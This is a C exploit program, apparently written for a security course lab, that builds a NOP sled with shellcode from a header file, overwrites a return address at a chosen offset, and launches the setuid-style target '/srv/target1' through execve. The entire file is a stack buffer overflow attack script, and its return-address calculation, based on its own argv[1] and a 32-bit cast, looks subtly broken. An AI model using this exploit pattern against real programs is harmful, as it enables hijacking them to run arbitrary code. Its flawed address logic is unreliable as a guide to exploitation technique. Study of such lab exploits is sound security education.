#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <buffer_size> <offset_to_ret> <return_address_offset>\n", argv[0]);
        exit(1);
    }

    int buffer_size = atoi(argv[1]);
    int offset_to_ret = atoi(argv[2]);
    int return_address_offset = atoi(argv[3]);

    char *args[3];
    char *env[1];
    char buf[buffer_size];

    // Print the addresses of relevant variables and the shellcode length
    printf("Address of buf: %p\n", (void*)buf);
    printf("Address of argv[0]: %p\n", (void*)argv[0]);
    printf("Address of argv[1]: %p\n", (void*)argv[1]);
    printf("Shellcode length: %d\n", sizeof(shellcode) - 1);

    // Fill the buffer with NOP instructions (\x90)
    memset(buf, '\x90', sizeof(buf));

    // Copy the shellcode to the end of the buffer
    memcpy(buf + sizeof(buf) - sizeof(shellcode), shellcode, sizeof(shellcode));

    // Calculate the return address based on argv[1] and print it
    unsigned int return_address = (unsigned int)argv[1] + offset_to_ret + return_address_offset;
    printf("Chosen return address: 0x%x\n", return_address);

    // Overwrite the return address in the buffer
    *(unsigned int*)(buf + offset_to_ret) = return_address;

    // Print the contents of the buffer to verify the exploit setup
    printf("Buffer contents:\n");
    for (int i = 0; i < sizeof(buf); i++) {
        printf("\\x%02x", (unsigned char)buf[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    printf("\n");

    // Set up the arguments and environment for the target program
    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;
    env[0] = NULL;

    // Print the addresses of args[0] and args[1] to verify they are set correctly
    printf("Address of args[0]: %p\n", (void*)args[0]);
    printf("Address of args[1]: %p\n", (void*)args[1]);

    // Execute the target program
    printf("Executing target program...\n");
    execve(TARGET, args, env);

    // If execve returns, there was an error
    fprintf(stderr, "execve failed.\n");

    return 0;
}